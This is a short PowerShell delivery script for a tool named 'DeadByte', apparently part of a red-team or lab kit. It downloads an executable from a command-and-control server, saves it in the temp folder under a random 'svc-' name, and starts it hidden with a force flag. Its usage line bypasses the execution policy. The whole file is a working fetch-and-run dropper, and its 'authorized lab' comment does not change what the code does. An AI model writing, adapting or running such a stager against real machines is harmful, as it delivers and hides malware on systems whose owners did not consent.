# DeadByte - delivery template for Windows (PowerShell).
# Use in an authorized lab:
#   powershell -ExecutionPolicy Bypass -File run.ps1 -C2Url http://192.0.2.10:8443 -Blob "<blob do -config-gen>"
param(
    [string]$C2Url = "http://127.0.0.1:8443",
    [string]$AdminToken = "change-me-admin-token",
    [string]$Blob = "",
    [string]$LogFile = "$env:TEMP\deadbyte.log",
    [switch]$NoForce,   # use -NoForce only on a NON-elevated machine / outside a VM
    [string]$OutDir = "$env:TEMP"
)
$ErrorActionPreference = "Stop"
$name = "svc-" + (Get-Random -Maximum 99999) + ".exe"
$dest = Join-Path $OutDir $name
$headers = @{}
if ($AdminToken) { $headers["Authorization"] = "Bearer $AdminToken" }
try {
    Invoke-WebRequest -Uri "$C2Url/artifacts/deadbyte-payload-windows-amd64.exe" -Headers $headers -OutFile $dest
} catch {
    Write-Host "ERROR: payload download failed ($C2Url). Is Kali reachable? Is the firewall open?" -ForegroundColor Red
    throw
}
$payloadArgs = @("-force", "-verbose", "-log-file", $LogFile)
if ($NoForce) { $payloadArgs = @($payloadArgs | Where-Object { $_ -ne "-force" }) }
if ($Blob) { $payloadArgs = @("-config", $Blob) + $payloadArgs }
Write-Host "Starting hidden payload. Follow the log: $LogFile"
Start-Process -FilePath $dest -ArgumentList $payloadArgs -WindowStyle Hidden
